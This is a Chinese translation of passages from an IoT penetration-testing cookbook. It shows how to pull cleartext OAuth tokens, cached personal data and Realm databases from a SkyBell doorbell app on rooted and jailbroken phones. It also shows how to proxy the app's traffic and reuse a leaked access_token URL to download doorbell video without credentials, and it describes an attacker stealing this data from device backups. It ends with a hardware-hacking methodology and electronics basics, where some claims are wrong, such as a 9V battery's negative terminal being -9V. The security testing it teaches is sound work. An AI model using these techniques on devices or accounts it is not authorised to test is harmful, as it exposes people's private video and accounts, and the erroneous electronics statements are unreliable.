不幸的是，iOS 开发人员倾向于忽略苹果提供的数据存储 API 控制。这导致数据通过明文数据库（包括 realm DBs）、plist 文件（属性列表）、缓存、键盘和其他存储位置泄漏。有时，应用程序使用的混合框架会鼓励这种行为以提高应用程序性能，但未列出安全后果。根据混合框架和自定义模块的不同，可能需要插件来清除缓存等位置，这增加了开发人员的复杂性。本节将帮助您分析 IoT iOS 应用程序的数据存储。

# 准备工作

对于这个示例，需要一个已经越狱的 iDevice，以及一个名为 idb 的免费工具。Idb 是一个在 OS X 上运行的免费工具，Ubuntu 用于简化常见的 iOS 应用程序安全评估任务。它目前已安装在附带的虚拟机中，但也可以通过访问 idb 的网页[`www.idbtool.com/`](http://www.idbtool.com/)手动安装。如果您使用**gem**来管理 Ruby，可以使用`gem install idb`来安装 idb。

在撰写本文时，idb 不支持 iOS 10 应用程序。

要查看 SQLite 数据库条目，请下载并安装 sqlitebrowser，网址为[`sqlitebrowser.org`](http://sqlitebrowser.org)。SQLite 浏览器也已包含在为本书提供的虚拟机中。

# 如何操作...

1.  从终端启动 idb，只需执行`idb`，用户界面将出现：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/e892dd5c-2e9c-4caf-a668-54d0fea38072.png)

1.  接下来，选择连接到 USB/SSH 设备：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/46387dad-6125-4d60-8c77-2815f950d044.png)

1.  如果这是您第一次使用 idb，那么需要在越狱设备上安装几个软件包，如果 idb 可以通过 USB 或 SSH 访问设备，它将自行安装这些软件包。这些软件包列在以下屏幕截图中。

越狱 iDevices 的默认用户名和密码是 alpine。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/825424a3-190e-4933-83f0-a090d178671f.png)

1.  如果所有所需的软件包都已安装，请从应用程序选择菜单中选择一个应用程序。在这种情况下，选择了 com.skybell.doorbell：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/ed716c17-98c5-4abf-a59c-fe286ec911d6.png)

1.  选择了 SkyBell 应用程序后，我们现在可以专注于应用程序内容以及应用程序如何存储数据。有几个功能可用于自动化 iOS 应用程序评估任务，但是在本演示中将分析存储。要分析应用程序的数据存储，请选择 Storage 选项卡，选择 plists 选项卡，然后按刷新按钮：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/181efd97-80c8-4cd7-8fdf-2c64fa1acea6.png)

1.  有许多文件出现，但很多对我们的目的不相关。最初要考虑分析的文件是应用程序包目录中的`Info.plist`文件，以及应用程序在运行时创建的任何偏好文件。在这种情况下，偏好文件被列为 com.skybell.doorbell.plist。我们想要在清晰的 plist 文件中寻找的是关于公司本身或用户的任何个人或敏感数据。如果我们双击打开偏好文件，我们将看到存储在未受保护存储中的 OAuth`access_tokens`和`refresh_tokens`（CVE-2017-6082）。这些明文令牌可以在以下屏幕截图中看到。通常，`access_tokens`持久存在以提高用户体验，这样每次打开应用程序时都不需要登录：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/e3f324dc-7fc1-46c5-afd7-08fe75d98b68.png)

1.  当会话令牌以明文形式存在时，数据很可能没有在多个区域安全存储。在磁盘上寻找存储的敏感数据的常见区域是应用程序启动时在应用程序的`data`目录中生成的任何类型的数据库或文件。Idb 有能力分析这些区域。我们将查看 Cache.db 选项卡，看看我们找到了什么。

导航到 Cache.dbs 选项卡，选择刷新按钮，并双击打开 Cache.db 条目：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/34802275-4b2c-4b57-8d6a-5e5bdee0c3d4.png)

1.  如下截图所示，此 SQLite 数据库中有许多表：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/db223886-7e3f-4934-bdc7-1b2d3036488a.png)

1.  这些表包含可以视为文本的 BLOB 数据。事实证明，该应用程序缓存了所有请求和响应，其中包括个人详细信息和令牌数据（CVE-2017-6084）：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/f1823557-28d2-4ffe-a4de-b17e369bcf8c.png)

可以通过指定编辑器路径来利用自定义 SQLite 外部编辑器，例如通过 idb 的设置（例如，`~/.idb/settings.yml`）。

攻击者可以在启用了自动备份设置的情况下，将受害者的手机插入 iTunes，从而窃取这些数据。攻击者需要插入一个测试 iDevice 并将其恢复到受害者的备份。另一种技术是使用诸如 iFunbox 之类的工具，该工具可以访问非越狱设备的文件系统（[`www.i-funbox.com/`](http://www.i-funbox.com/)）。在这一点上，攻击者可以外部传输应用的`Cache.db`，plist 和 SQLite 数据库，以获取会话令牌和其他个人账户信息的访问权限。在这种情况下，攻击者可以查看视频门铃的视频源，并通过调整运动设置或将视频源共享到外部账户来更改其配置。

有了这些知识，可以在不代理连接的情况下查看会话管理控件和 API 数据。可以根据前述的移动应用程序安全检查表来分析会话过期和随机化测试。可以修改`plist`文件或`Cache.db`中的数据，并将其上传回设备，以观察应用程序与这些文件的信任关系。

# 还有更多...

还可以分析其他未在本节中涵盖的数据存储位置。未讨论的项目包括钥匙链、本地存储、领域数据库、日志、BinaryCookies 等许多其他存储位置。请查看 OWASP 的移动安全测试指南，了解有关在 iOS 应用程序中测试数据存储弱点的技术的更多详细信息：[`github.com/OWASP/owasp-mstg/blob/master/Document/0x06d-Testing-Data-Storage.md`](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06d-Testing-Data-Storage.md)。

# 另请参阅

+   要了解有关 idb 功能的更多信息，请查看 idb 提供的文档 [`www.idbtool.com/documentation/`](http://www.idbtool.com/documentation/)。

# 分析 Android 数据存储

在运行时，有几种测试 Android 数据存储的方法。提供了免费和商业的 Android 测试发行版，以帮助自动查看和修改常见的数据存储文件位置。在手动方法中，我们希望在应用程序运行时分析以下常见的存储位置：

+   `/data/data/<package_name>/`

+   `/data/data/<package_name>/databases`

+   `/data/data/<package_name>/shared_prefs`

+   `/data/data<package_name>/files/<dbfilename>.realm`

+   需要一个 Realm 浏览器（[`itunes.apple.com/us/app/realm-browser/id1007457278?`](https://itunes.apple.com/us/app/realm-browser/id1007457278?)）

+   `/data/data/<package name>/app_webview/`

+   Cookies

+   本地存储

+   Web 数据

+   `/sdcard/Android/data/<package_name>`

在 Android 中，应用程序的文件结构不会改变，这使得手动分析更加容易。这个步骤将帮助您分析 IoT Android 应用程序的数据存储。

# 准备就绪

此步骤需要以下物品：

+   一个已 root 的 Android 设备（启用了 USB 调试）或一个已 root 的 Android 模拟器。

+   **Android 调试桥**（**ADB**）：ADB 可在附带的虚拟机中使用，也可以通过 URL [`developer.android.com/studio/releases/platform-tools.html`](https://developer.android.com/studio/releases/platform-tools.html) 手动安装。

# 如何做...

1.  确保使用以下命令连接了测试 Android 设备或模拟器：

```
# adb devices
List of devices attached 
0a84ca7c device

```

1.  连接到测试 Android 设备的控制台，并使用以下 ADB 命令切换到 root 用户：

```
# adb shell
shell@flo:/ $ su
root@flo:/ #
```

1.  更改目标应用程序的目录如下：

```
# cd data/data/com.skybell.app/
# ls -al
    drwxrwx--x u0_a92   u0_a92            2017-06-23 14:59 app_7122720ab47b4f6c8ad99ba61f521dd2515d6767-01b7-49e5-8273-c8d11b0f331d
    drwxrwx--x u0_a92   u0_a92            2017-01-30 18:46 cache
    drwxrwx--x u0_a92   u0_a92            2017-01-17 16:41 files
    lrwxrwxrwx install  install           2017-06-23 14:58 lib -> /data/app/com.skybell.app-1/lib/arm
    drwxrwx--x u0_a92   u0_a92            2017-01-17 16:41 no_backup
    drwxrwx--x u0_a92   u0_a92            2017-06-23 15:31 shared_prefs

```

1.  首先，浏览到`shared_prefs`目录，列出每个文件，并查看可用的首选项文件，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/8f2bec1c-8ba3-4d5c-b0a5-e18fb387ce90.png)

似乎存在特殊的编码；应用程序正在运行字符串，这些字符串可能与登录凭据有关，但它确实显示了帐户的用户名。

1.  接下来，我们将检查`com.skybell.app.networking.oauth.oauth_shared_preferences_key.xml`文件，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/8b771c3f-4d52-4278-a78f-0f5560af21bc.png)

1.  我们的帐户 OAuth 令牌似乎以明文存储，类似于我们在 iOS 应用程序中看到的情况。有一个可用的`files`目录，其中可能有可以查看的 Realm 数据库文件。更改到`files`目录并列出文件，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/7773cad1-5c5c-4cd3-a32c-b27ea8c65f40.png)

1.  应用程序似乎使用了一个 Realm 数据库。注意 Realm 数据库所在的目录，并使用以下`adb`命令将文件拉到您的主机计算机：

```
adb pull data/data/com.skybell.app/files/default.realm /path/to/store/realdb

```

在撰写本文时，Realm 数据库只能在使用 App Store 中提供的 Real Browser 的 OS X 计算机上查看。有非官方的 Real Browser 适用于 Android 和 iOS，需要从源代码构建。有关 Realm 数据库的更多详细信息，请访问[`news.realm.io/news/realm-browser-tutorial/`](http://news.realm.io/news/realm-browser-tutorial/)。

1.  双击`default.realm`文件，将在 Real Browser 中打开 Realm 数据库，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/3241e3d0-e5dd-4aca-a55f-436d179d16b1.png)

DeviceRecord 模型说明了门铃的名称和状态，即在线或离线，而 DeviceRecordActivity 模型列出了事件、它们的时间戳和事件的缩略图。这是一种数据泄露，可以通过将 Android 设备备份到计算机并像 iPhone 一样还原，或者通过启用 ADB 后以与通过 ADB 相同的方式提取数据。不幸的是，此应用程序在`AndroidManifest.xml`中没有标记`[android:allowBackup=false]`，这本来可以减轻这个特定问题，但在这种情况下，存储会使客户面临风险或涉及隐私问题，这仍然是不良做法。

# 另请参阅

+   请查看 OWASP 的移动安全测试指南，了解有关测试 Android 应用程序中数据存储弱点的技术的更多详细信息：[`github.com/OWASP/owasp-mstg/blob/master/Document/0x05d-Testing-Data-Storage.md`](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05d-Testing-Data-Storage.md)。

# 执行动态分析测试

在这个阶段，我们已经静态分析并评估了示例 IoT 移动应用程序中数据的存储方式。我们还没有查看应用程序和服务器之间发送的 API 流量。在运行时查看和篡改应用程序通信被称为**动态分析**。动态分析测试侧重于评估应用程序在执行过程中的情况。动态分析既在移动平台层进行，也针对移动应用程序的后端服务和 API 进行，其中可以分析请求和响应。在本示例中，我们将为 iOS 设置动态分析测试环境，并为您介绍一些测试用例。

# 做好准备

对于此示例，将使用 Burp Suite 和/或 OWASP ZAP 来观察应用程序通信。还需要访问 iDevice 和 Android 设备来执行此示例。iDevice 和 Android 设备不必经过越狱或 root，这是查看应用程序通信的好方法。尽管这些步骤适用于两种移动平台，但本示例中的示例仅适用于 iOS。

# 如何做...

1.  与配置 Web 应用程序测试环境类似，需要在您的越狱设备上安装 ZAP 和 Burp Suite 的 CA 证书以代理`HTTPS`请求。这可以通过调整移动设备的 Wi-Fi 代理设置来实现，以指向您的 Burp Suite 侦听器的 IP 和端口，如以下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/364d88e0-e9af-471c-b9e7-1a11bc332c70.png)

以下截图显示了如何配置 iOS 设备的代理设置，以指向您的 Burp 代理侦听器。在这种情况下，我的 Burp 代理正在监听 IP 地址`192.168.2.183`和端口`8080`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/76abc6a0-33f7-419c-8429-80f31bc76dd8.png)

1.  接下来，通过导航到 Burp 的 IP 和端口，并使用`/cert`作为 URL 路径，将 Burp 的 CA 证书添加到设备。在这种情况下，Burp 的地址是`http://192.168.2.183:8080/cert`，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/e04fb789-ca33-4229-b092-722e8a43993e.png)

1.  执行后，iOS 将询问您是否要安装 Burp 的 CA 证书配置文件，如下图所示。选择安装，`HTTPS`流量现在可以由 Burp Suite 分析。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/22528c5a-ea59-4d64-99f0-e5fca8a637a0.png)

以下截图显示了从我们的移动设备通过 Burp 套件代理的`HTTPS`请求。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/447e7e83-93aa-4351-b4ca-c5e9fdd5b778.png)

通过 Burp 套件代理的 HTTPS 请求

1.  类似的步骤也可以用于 Android 设备。我们将演示如何设置 ZAP 的 CA 证书。首先，通过导航到工具|选项|动态 SSL 证书来导出 ZAP 的证书。将证书保存在方便的位置，以便传输到 Android 设备：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/7b4d937b-ea2e-4abf-96cd-cab8cbbd01e9.png)

1.  `ZAPCert`需要下载到 Android 设备上。有几种方法可以帮助满足此要求。一个快速方便的文件传输技巧是使用 Python 的`SimpleHTTPServer`。如果您使用的是基于 Nix 的操作系统，请从证书所在的目录运行以下命令：

```
$ python -m SimpleHTTPServer 1111
```

1.  Python web 服务器现在将在端口`1111`上运行。在您的 Android 设备上，打开浏览器并导航到您的监听 Web 服务器。在这种情况下，地址是`http://192.168.2.186:1111`，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/765aa81c-0620-4a2a-bee6-86f718f7f53e.png)

1.  将证书下载到 Android 设备。在 Android 设备上，导航到设置|安全|从存储安装，然后下载文件夹应该出现，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/ab5204a9-abe8-4053-b931-7209b075b804.png)

1.  选择 ZAP 的证书，并按照以下截图中所示命名证书：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/7de4d427-54e3-4e62-8a4a-45f609d3182e.png)

1.  转到您的无线设置，并修改代理设置以匹配您的 ZAP 代理侦听器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/900ce53b-7395-4648-86c5-ab9bfca16c0b.png)

1.  导航到目标 IoT 移动应用程序，并观察`HTTPS`请求和响应填充 ZAP 的历史选项卡：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/22118096-fa90-4f4b-9ff3-e8ec2cb7f068.png)

1.  Android 和 iDevice 都已设置为代理应用程序的请求和响应。通过这种访问，可以对参数进行模糊处理以进行注入漏洞测试（如果已经获得授权），并且可以测试应用程序的业务逻辑漏洞。例如，在查看来自我们目标门铃的视频时代理请求和响应，我们注意到`access_token`作为`GET`请求中的 URL 参数发送到视频的 MP4 文件（CVE-2017-6085）。将此`GET`请求复制到剪贴板并粘贴到浏览器中，即可访问下载 MP4 视频，无需用户名或密码，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/781c9f74-c2e0-4171-bb21-c18aa0b1e266.png)

无需用户名或密码即可下载 MP4 视频

1.  然后将请求复制到我们的剪贴板：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/4ffcdef1-0033-4793-924c-ecb50e821ebf.png)

1.  将 URL 粘贴到浏览器中，并观察视频门铃事件的自动下载到您的本地计算机：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/b7822852-d7b4-43fd-8d40-54cb243ce21d.png)

一旦在浏览器中请求复制的 URL，浏览器应自动询问在本地计算机上保存下载视频的位置：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/af1ad43b-205a-417a-b162-b10d2d974443.png)

现在视频已经以`.mp4`的格式下载，并且可以像以下截图中所示查看：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/4c6763e7-c6c6-4fe7-b938-db8e0782430e.png)

1.  请记住，我们没有输入任何用户名或密码来下载和观看这个视频。这表明门铃制造商对用户的访问控制存在问题，并且可能还表明产品中存在其他漏洞。对于视频门铃来说，在没有凭据的情况下访问视频源存在安全和隐私风险。仅在这一发现中就可以识别出几个漏洞，包括将会话令牌作为`GET`请求发送、令牌过期不足以及访问控制不足。攻击者可以通过社会工程或 MITM 技术获取必要的`access_token`。可以通过外部用户帐户执行额外的访问控制测试用例以跟进此发现。

# 另请参阅

+   对于一些 Android 应用程序，MobSF 具有在模拟器、虚拟机甚至物理设备内执行动态测试的能力。对于 Android 应用程序的动态测试还包括测试意图和活动。MobSF 的维基中列出了一些注意事项（[`github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/2.-Configure-MobSF-Dynamic-Analysis-Environment-in-your-Android-Device-or-VM`](https://github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/2.-Configure-MobSF-Dynamic-Analysis-Environment-in-your-Android-Device-or-VM)）。如果您正在测试的应用程序需要访问硬件，比如相机或无线协议（即蓝牙、ZigBee 或 Z-Wave），建议您使用物理设备并进行手动测试。

+   要了解有关 Android 和 iOS 应用程序安全测试的更多信息，请访问 OWASP 的移动安全测试指南：[`github.com/OWASP/owasp-mstg/`](https://github.com/OWASP/owasp-mstg/)。


# 第六章：物联网设备黑客

在本章中，我们将涵盖以下主题：

+   硬件利用与软件利用

+   硬件黑客方法论

+   硬件侦察技术

+   电子学 101

+   识别总线和接口

+   嵌入式设备的串行接口

+   NAND 故障

+   JTAG 调试和利用

# 介绍

任何**物联网**（**IoT**）解决方案的关键中心组件是嵌入式设备。它是与物理环境互动并与网络端点和周围其他设备通信的设备。了解如何利用这些硬件设备对于进行物联网渗透测试非常关键。

在物联网解决方案中使用的设备类型可能因产品而异。在某些情况下，它可能是一个网关，允许各种设备与其互动，同时与网络端点通信，或者它可能是一个医疗设备实用程序，其唯一目的是从患者的身体收集数据并在智能手机上显示。

然而，存在某些特定的安全问题，可能会影响任何给定的硬件设备，无论其类别如何。这就是我们将在本章中关注的内容-深入了解各种物联网设备安全问题，如何识别它们以及如何利用它们，无论设备类型如何。但是，在我们进行实际的硬件利用之前，让我们看看硬件利用与传统软件利用有何不同。

# 硬件利用与软件利用

硬件利用与软件利用之间的差异非常显著，最重要的是，要找到硬件的漏洞和利用，你需要拥有物理设备。这意味着除非你拥有两个或更多的设备，否则要有效地对物联网设备的硬件进行渗透测试是相当复杂的。

增加与硬件安全工作复杂性的另一个因素是围绕硬件安全公开可用的资源量。例如，在你正在评估的软件的情况下，你可能会发现软件正在使用的某个组件中存在现有的漏洞或者是你正在使用的软件类型中发现的常见漏洞的机会。这并不意味着硬件利用更加困难，只是意味着如果你刚开始，由于缺乏给定组件的深入的与安全相关的信息，你可能会发现硬件利用相对于以前的软件利用经验更加复杂。

在基于硬件的漏洞方面，还有一件事需要注意的是，它们相对更难修补，在某些情况下，甚至无法在不完全更换设备的情况下修补。这意味着如果硬件设备本身存在关键的安全问题，制造商唯一的选择就是召回设备并用更安全的设备替换它们。

最后，对于我们作为渗透测试人员来说，最显著的区别之一是，对于硬件利用，我们需要一些硬件工具和设备来有效地评估和利用最终设备的安全性。

然而，不要感到沮丧，因为我们将涵盖许多硬件利用的工具和技术，这将让你迅速进入硬件黑客的世界。

# 硬件黑客方法论

硬件黑客方法论涉及的步骤如下：

+   信息收集和侦察

+   对设备进行外部和内部分析

+   识别通信接口

+   使用硬件通信技术获取数据

+   使用硬件利用方法的软件利用

+   后门设置（可选）

让我们逐个深入了解每一个步骤。

# 信息收集和侦察

嵌入式设备黑客方法论的第一步是尽可能收集关于我们正在处理的目标的信息。现在这可能听起来很简单，但在嵌入式设备的情况下，这可能比我们想象的要复杂一些。关于目标设备的信息通常是有限的-至少从一个非常高层次的视角来看-考虑到为了获得有关设备的相关信息，我们将需要访问物理设备本身。

但即使在这之前，渗透测试人员可以通过多种方式收集有关给定目标设备的更多信息。这些包括公开可用的来源或客户提供的文档，或通过其他资源。

在这个阶段可能相关的一些信息包括：

+   嵌入式设备基于什么？

+   它运行的操作系统

+   设备支持哪些外部外围设备？

+   设备使用了什么样的芯片组件？

+   关于设备使用的存储和内存的详细信息

+   关于设备的任何其他相关技术信息

一旦我们获得了这些信息，我们就可以进入下一步，即使用外部和内部分析来分析设备。

# 设备的外部和内部分析

一旦你从上一步获得了信息，下一步就是开始与设备本身进行交互。在这里，目标是从攻击者的角度查看设备，并通过视觉检查-包括外部和内部-尽可能多地识别信息。

外部分析非常直接，可以通过查看设备并找出所有你能看到的各种组件来进行。在这里，你可能会问自己以下问题：

+   设备的各种接口选项是什么-它是否有任何 USB 端口、SD 卡插槽或以太网端口？

+   设备是如何供电的-通过电池、PPoE 还是适配器？

+   设备上有标签吗？如果有，它们包含什么样的信息？

一旦我们完成了外部分析，下一步就是进行设备的内部分析。这需要你打开设备，查看**印刷电路板**（**PCB**）。在这一步中，我们将识别设备中的各种芯片组件，查阅它们的数据表，并了解每个特定组件的功能，以及记录从数据表中找到的各种信息。

在这个阶段，我也喜欢绘制各种组件之间的基本连接的框图，以便更清楚地了解整个设备的内部情况。

# 识别通信接口

一旦我们查看了 PCB 并找到了关于整个电路和其中涉及的各种组件的足够信息，下一步就是寻找与设备进行接口的所有可能选项。

在某些情况下，它可能非常明显并且直接摆在你面前，而在其他情况下，可能更难以识别，可能分散在整个电路板上，或者在某些情况下，你将不得不直接连接到给定芯片组件的引脚上。

# 使用硬件通信技术获取数据

一旦我们确定了正在使用的通信协议/接口，我们可以使用一组特定的工具来通过给定的协议与目标设备通信，并与目标交互或读/写信息到给定的芯片。

根据受审查的接口，我们将使用不同的技术来连接并获取有用的渗透测试数据。一些常见的接口包括 UART、JTAG、SPI、I2C 和 1-Wire。

# 使用硬件开发方法进行软件开发利用

一旦我们通过给定的硬件接口访问了目标设备，下一步将是通过硬件利用执行各种软件利用技术。这包括执行诸如转储固件、在给定的内存区域写入新内容、对运行进程进行修改等操作。

正如你现在可能已经了解的那样，大多数利用硬件技术的攻击将使你获得对敏感资源的访问，然后可以以多种方式进行利用。

现在我们对整体硬件渗透测试方法论有了了解，让我们深入了解如何对硬件设备进行侦察。

# 硬件侦察技术

除了视觉外部分析之外，侦察包括两个步骤-打开设备并查看各种芯片的存在，并从其数据表中获取信息。

让我们逐一深入了解。

# 打开设备

硬件侦察过程的第一步是打开设备。这个过程的复杂性取决于你所使用的设备，可以从非常简单到非常复杂不等。

在一些设备中，你会发现螺丝隐藏在腿部的橡胶垫下，而在其他情况下，它们会大部分暴露出来，而在其他情况下，两个不同的部分可能会被焊在一起。

根据设备的组装方式，使用适当的工具拆卸不同的部分。建议在整个硬件利用过程中携带一套好的螺丝刀，因为不同的设备会使用许多不同种类的螺丝。

# 查看各种芯片的存在

一旦你打开了设备，下一步是查看 PCB 并识别所有各种芯片的存在。使用 USB 显微镜或智能手机的手电筒来读取芯片的标签，同时倾斜芯片。建议使用支架，可以在读取各种芯片的名称时稳定地固定设备。

一旦你弄清楚了芯片的名称，就去谷歌搜索它的制造商，然后加上型号和“数据表”这个词。这也是我们将在本章后面做的事情。

一旦你有了数据表，你可以利用其中的信息来找出目标芯片的各种属性，包括引脚布局，在硬件利用过程中这将非常有用。

现在我们知道如何对目标设备进行侦察，我们可以继续深入硬件利用。为了确保我们非常了解我们的目标，并确保我们的攻击成功，我们需要更好地了解电子学，这将使我们在进行利用时更容易理解。

# 电子学 101

正如前面提到的，电子学是要理解的最重要的事情之一，如果你想进行硬件黑客攻击。你可能能够在不了解电子学的情况下捕捉一些低悬漏洞；然而，要擅长这个领域，你需要了解设备上发生了什么，以及如何利用给定的组件。在本节中，我们将介绍一些电子学的基本概念，这将帮助你在开始研究嵌入式设备内部时获得更多的信心和理解。

这对你来说可能看起来非常基础；然而，把这一节当作你将在后面的章节和实际生活中所看到的东西的一个复习，当你开始使用嵌入式设备时。

# 电阻

电阻器是电子元件，它们阻碍电流流动，或者更深层次地说，阻碍电子的流动。电阻器，用*R*表示，是被动元件，这意味着它们根本不产生任何电力，而是通过散热的方式降低电压和电流。

电阻的单位是欧姆（Ω），电阻通常使用碳或金属线制造。你还会发现电阻器被编码颜色，以帮助传达它们提供的电阻值。

这就是电阻器的样子：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/c2aac831-cac2-4e0b-a47a-f4c01b8de34c.jpg)

现在你知道了电阻器是什么，值得注意的是，电阻器可能有两种不同的类别-固定和可变。顾名思义，固定电阻器的电阻是固定的，不能改变，而在可变电阻器中，电阻可以使用某些技术进行变化。可变电阻器最流行的例子之一是**电位器**。

# 电压

在电子学中，电压简单地是两个不同测量点之间的电势能差。在大多数情况下，用来测量给定点电压的参考点是**地**（**GND**），或者电池或电源的负极。举个现实生活中的例子，如果你使用了一个 9V 电池，这意味着两点之间的电势差为 9 伏特。

为了更深入地了解，让我们假设在导体的两端，比如铜线，你有大量的电子（负电荷），在另一端你有质子（正电荷）。这意味着这两点之间的电势存在差异，最终导致电流的流动。

为了测量电压，我们使用一种叫做**电压表**的设备，它告诉我们它连接的两点之间的电势差。例如，9V 电池的正极电压为+9V，负极电压为-9V。

# 电流

正如我们在前面的情景中讨论的，电流流动（在前述情况下是因为介质是铜导体）当两端的电压存在差异时，它将继续流动，直到两侧的电子和质子数量相等。

电流可以是**交流**（**AC**）或**直流**（**DC**），这意味着如果电流以恒定速率流动，比如在电池中，它将是直流，而如果它是交变的或随时间变化的，它就是交流。例如，在美国，从电源插座获得的默认电力是 120V 和 60Hz 的交流电。

电流以**安培**（**A**）为单位进行测量，并在方程和公式中用字母*I*表示。用于测量电流的设备称为**安培表**。

你可能会认为这三个组件-电流、电压和电阻似乎是相互依赖的。总结一下，电压引起电流流动，电阻阻碍电流流动。

这种关系就是著名的**欧姆定律**，它规定*电流（I）=电压（V）/电阻（R）*。

这也证实了电流与电压成正比，与电阻成反比的事实。

# 电容器

电容器是几乎所有嵌入式设备中最常见的组件之一。顾名思义，它们的主要任务之一是以电荷的形式储存能量。

电容器内部有两个带有相反电荷的板，当连接到电源时，它们储存电荷。电容器的其他用途包括作为滤波器，减少影响设备上其他芯片的电噪声，分离交流和直流组件（交流耦合）等。

电容的单位是法拉，用*F*表示，可以使用以下公式计算：

*C=Q/V*

这里，*C*是电容，*Q*是电荷，*V*是电压。

所有前述值都以法拉第（*F*）、库仑（*C*）和伏特（*V*）为标准单位进行测量。

# 晶体管

晶体管是电子元件，通过充当开关和放大器来发挥多种作用。

作为放大器，它可以接收小电流并放大它以产生更大的输出电流。其中一个例子是麦克风连接到扬声器，麦克风接收到小声音输入并放大后通过扬声器输出更大的声音。

同样地，作为开关，它可以接收小电流输入并用它来允许更大的电流流动，从而激活新的电流流动。

这是晶体管的外观：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/9d3cb606-5a66-4cc3-ada1-dddb67fc54b7.png)

以下是 NPN 晶体管（另一种类型是 PNP，箭头指向基）的示意图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/6295c4b8-4e43-426e-8d6a-8f054feff39c.png)

# 存储器类型

嵌入式设备中一些最重要的组件与数据存储有关，可以被设备用于多种目的。这是您可以找到固件和应用程序编程接口（API）密钥等内容的地方。嵌入式设备中的三种主要存储器类型及其细分如下：

+   随机存取存储器（RAM）

+   静态随机存取存储器（SRAM）

+   动态随机存取存储器（DRAM）

+   只读存储器（ROM）

+   可编程只读存储器（PROM）

+   可擦可编程只读存储器（EPROM）

+   混合

+   可擦可编程只读存储器（EEPROM）

+   闪存

各种存储器类型的区分是基于一些因素，如存储数据的能力，存储数据的时间，数据如何被擦除和重写，以及重写数据的过程是什么样的。

例如，SRAM 只在接收到电源供应时保存数据，而 DRAM 将每个数据位存储在单独的电容器中。此外，由于 DRAM 具有刷新周期（因为电容器最终会被放电），因此 SRAM 相对于 DRAM 来说速度更快。

同样地，根据数据可以被写入的次数，ROM 被分类为 PROM 或 EPROM。对于 PROM，一旦写入数据就无法修改，而在 EPROM 中，数据可以通过紫外线（UV）射线擦除，紫外线可以通过一个小窗口到达芯片，通过重置芯片并将其带到初始状态来擦除芯片。

然而，我们将遇到的两种最重要的存储器类型是 EEPROM 和 Flash，或者基于读取、写入和擦除周期的差异而言的 NOR 和 NAND Flash-取决于是否可以一次在整个块上执行操作（Flash），以及是否需要一次在单个位上执行操作（EEPROM）。

# 串行和并行通信

现在我们对一些电子元件有了基本的了解，让我们进入嵌入式设备中使用的不同种类的通信介质。

嵌入式设备中的数据通信方法有串行和并行通信。顾名思义，串行通信按顺序逐位发送数据。这意味着如果要传输 8 位，它将一个接一个地发送，只有当所有 8 位都接收到时，数据传输才完成。

然而，在并行通信的情况下，多个位将同时传输，因此使数据传输过程比其串行对应物更快。

您可能会认为并行通信会更好，并且由于数据传输速率更快，它会被广泛使用。然而，这并不是事实，因为我们没有考虑并行通信在电路板上所需的实际空间。

嵌入式设备的物理空间非常有限。因此，在数据传输方面，更快并不总是更好的选择，尤其是考虑到并行数据传输需要比串行数据传输更多的数据线。

一些并行数据传输通信的示例是 PCI 和 ATA，而串行通信是使用 USB、UART 和 SPI 进行的。

在本书中，我们将重点关注串行通信介质，因为它们在您将遇到的所有硬件设备中都是最常见的。

# 还有更多...

此时您还可以执行的一项工作是查看任何给定嵌入式设备的电路板，并尝试识别涉及的各种组件以及它们使用的通信机制是什么样的。

# 识别总线和接口

